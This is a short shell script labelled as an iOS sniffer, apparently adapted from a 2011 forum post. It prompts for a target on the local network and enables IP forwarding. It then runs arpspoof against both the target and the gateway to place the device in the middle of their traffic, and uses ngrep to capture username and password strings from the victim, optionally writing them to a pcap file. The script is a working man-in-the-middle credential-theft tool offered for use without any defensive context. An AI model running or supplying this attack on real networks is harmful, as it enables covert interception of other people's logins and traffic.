#!/bin/sh
#iOS sniffer
#original script by http://www.hackint0sh.org/f126/79207.htm
#edited on May 7th 2011
#url http://360percents.com
#author Luka Pusic <pusic93@gmail.com>

tbroadcast=`ifconfig en0|grep broadcast|cut -d" " -f6`
tgateway=`netstat -rn|grep default|grep en0|awk '{print $2}'`
tsubnet=`ifconfig en0|grep broadcast|cut -d" " -f2|cut -d '.' -f1-3`
tlocalip=`ifconfig en0|grep broadcast|cut -d" " -f2`
tmac=`ifconfig en0|grep ether|cut -d" " -f2`

echo ""
echo "#####################"
echo "### dSniff script ###"
echo "#####################"
echo ""
echo ""
echo "Subnet    $tbroadcast"
echo "Gateway   $tgateway"
echo "Local MAC $tmac"
echo "Local IP  $tlocalip"
echo "Start sniffing? (y,n)"
read tsniff
if [ $tsniff = y ]
then
    echo "Target IP $tsubnet.? (enter a number):"
    read "thost"
    tip=`echo $tsubnet.$thost`
    echo "Save output to pcap file? (path/n)"
    read tsave
    if [ $tsave != n ]
    then
        save="-O "$tsave
    fi
    sysctl -w net.inet.ip.forwarding=1
    arpspoof -i en0 -t $tip $tgateway > /dev/null 2>&1 &
    arpspoof -i en0 -t $tgateway $tip > /dev/null 2>&1 &
    ngrep $save 'USER|PASS|user|pass|username|password' src host $tip|egrep -A1 ">|USER|PASS|user|pass|username|password"
    sleep 3
    ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
    #dsniff
else
    echo ""
    echo "Clear state? (y,n)"
    read tstate
    if [ $tstate = n ]
    then
        ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
        exit 0
    else
        sysctl -w net.inet.ip.forwarding=0
        killall dsniff
        killall arpspoof
        killall ngrep
        sleep 3
        ps aux|egrep "arpspoof|dsniff|ngrep"|grep -v egrep
        echo "Exit"
        echo ""
        exit 0
    fi
fi

exit 0
